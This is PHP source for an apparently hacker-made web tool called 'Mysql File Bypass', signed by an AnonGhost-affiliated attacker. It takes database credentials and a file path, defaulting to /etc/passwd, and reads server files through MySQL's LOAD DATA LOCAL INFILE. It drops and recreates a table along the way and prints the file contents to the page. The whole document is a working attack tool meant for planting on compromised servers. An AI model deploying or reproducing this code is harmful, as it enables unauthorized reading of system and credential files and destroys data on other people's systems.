<?php
//GreetZ To All AnonGhost MemberZ \!/
session_start();  
@$_SESSION['host']=@$_POST['host'];  
@$_SESSION['user']=@$_POST['user'];  
@$_SESSION['password']=@$_POST['password'];  
@$_SESSION['db']=@$_POST['db'];  
?>  
<html><title>Mysql File Bypass</title>  
<body bgcolor=white>
<div align="center">
<center><font face="impact" size="12" color="#FF0000">Mysql File Bypass</font></center>
<p align="center">
<img border="0" src="https://sophosnews.files.wordpress.com/2011/09/mysql-170.jpg"></p>     
<table border="0" width="80%">          
<tr><td><form method="POST" action=""><p><b><font color="#FF0000">HOST: </font>                  
<input type="text" name="host" value="<?php echo @$_SESSION['host']; ?>" size="20"> 
<b><font color="#FF0000">|USER : </font><input type="text" name="user" value="<?php echo @$_SESSION['user']; ?>" size="20">                  
<b><font color="#FF0000">|PASSWORD : </font><input type="text" name="password" value="<?php echo @$_SESSION['password']; ?>" size="20"> 
<b><font color="#FF0000">|DATABASE : </font><input type="text" name="db" value="<?php echo @$_SESSION['db']; ?>" size="20"></p>                  
<b><p><font color="#FF0000">FILE : </font><input type="text" value="/etc/passwd" name="path" size="140"></p>                  
<p><center><input type="submit" value="Bypass File Now" name="lulZ"></p></form></center>      
<p><center><b><font size="2" face="shell" color="#FF0000">Coded By Mauritania Attacker</font></td></tr></table></div></center>     
<font color="red">      
<?php
if(@$_POST['path']){      
$host = $_SESSION['host'];      
$user = $_SESSION['user'];      
$pass = $_SESSION['password'];      
$db = $_SESSION['db'];      
if(mysql_connect("$host","$user","$pass")){ //The mysql extension is deprecated and will be removed in the future: use mysqli or PDO instead wkwkwkw let's wait the future xD!
mysql_select_db($db);      
mysql_query("drop table Mauritania");      
mysql_query("create table Mauritania (anonghost varchar(5024))");      
$path = $_POST['path'];      
$sql = "load data local infile '$path' into table Mauritania";      
mysql_query("$sql");      
$son = mysql_query("select * from Mauritania");      
echo '<textarea cols="100" rows="50">';
while($crazygh0stz = mysql_fetch_array($son)){      
echo $crazygh0stz["anonghost"]."\n";      
} 
echo '</textarea>';
}else{      
echo "Sorry The File Can't Be Read :(";      
}      
}      
?>  
</body>
</html>